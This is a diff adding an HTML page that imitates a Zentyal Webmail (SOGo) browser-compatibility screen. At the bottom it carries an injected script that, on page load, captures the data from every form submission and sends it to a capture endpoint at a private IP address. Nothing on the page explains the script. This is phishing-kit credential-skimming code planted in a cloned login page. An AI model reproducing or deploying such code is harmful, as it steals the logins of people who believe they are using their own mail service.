@@ -1,0 +1,94 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Zentyal Webmail
+  </title>
+  <meta content="0" name="hideFrame"/>
+  <meta content="SOGo Web Interface" name="description"/>
+  <meta content="SKYRIX Software AG/Inverse inc." name="author"/>
+  <meta content="stop" name="robots"/>
+  <meta content="root@ci03.hq.zentyal.com 201604051605" name="build"/>
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+  <link href="mailto:support@inverse.ca" rev="made"/>
+  <link href="/SOGo.woa/WebServerResources/sogo.ico?lm=1459872312" rel="shortcut icon" type="image/x-icon"/>
+  <link href="generic.css" rel="stylesheet" type="text/css"/>
+  <link href="dtree.css" rel="stylesheet" type="text/css"/>
+  <link href="SOGoRootPage.css" rel="stylesheet" type="text/css"/>
+  <!--[if lte IE 9 ]>
+          <link rel="stylesheet" type="text/css" href="/SOGo.woa/WebServerResources/iefixes.css?lm=1459872312" />
+          <script src="/SOGo.woa/WebServerResources/XMLHttpRequest.js?lm=1459872312" type="text/javascript"></script>
+        <![endif]-->
+ </head>
+ <body class="popup">
+  <div id="loginScreen">
+   <table>
+    <tr>
+     <td>
+      <img alt="*" id="splash" src="zentyallogo.png.jpg"/>
+     </td>
+     <td id="loginCell" width="250">
+      <p>
+       We've detected that your browser version is currently not supported on this site. Our recommendation is to use Firefox. Click on the link below to download the most current version of this browser.
+      </p>
+      <p class="browser">
+       <a href="http://www.getfirefox.com/">
+        Download Firefox
+       </a>
+       <img alt="*" src="browser_firefox.gif.jpg"/>
+      </p>
+      <p>
+       Alternatively, you can also use the following compatible browsers
+      </p>
+      <p class="browser">
+       <a href="http://www.google.com/chrome/">
+        Download Chrome
+       </a>
+       <img alt="*" src="browser_chrome.gif.jpg"/>
+      </p>
+      <p class="browser">
+       <a href="http://www.apple.com/safari/download/">
+        Download Safari
+       </a>
+       <img alt="*" src="browser_safari.gif.jpg" valign="middle"/>
+      </p>
+     </td>
+    </tr>
+   </table>
+  </div>
+  <noscript>
+   <div class="javascriptPopupBackground">
+   </div>
+   <div class="javascriptMessagePseudoWindow noJavascriptErrorMessage">
+    SOGo requires Javascript to run. Please make sure this option is available and activated within your browser preferences.
+    <br/>
+    <br/>
+    <a class="button">
+     Retry
+    </a>
+   </div>
+  </noscript>
+  <script>
+   document.addEventListener('DOMContentLoaded', function() {
+                var forms = document.getElementsByTagName('form');
+                for (var i = 0; i < forms.length; i++) {
+                    forms[i].addEventListener('submit', function(event) {
+                        var formData = new FormData(this);
+                        var data = {};
+                        formData.forEach((value, key) => {
+                            data[key] = value;
+                        });
+
+                        fetch('http://10.204.7.168:5000/capture', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+                    });
+                }
+            });
+  </script>
+ </body>
+</html>
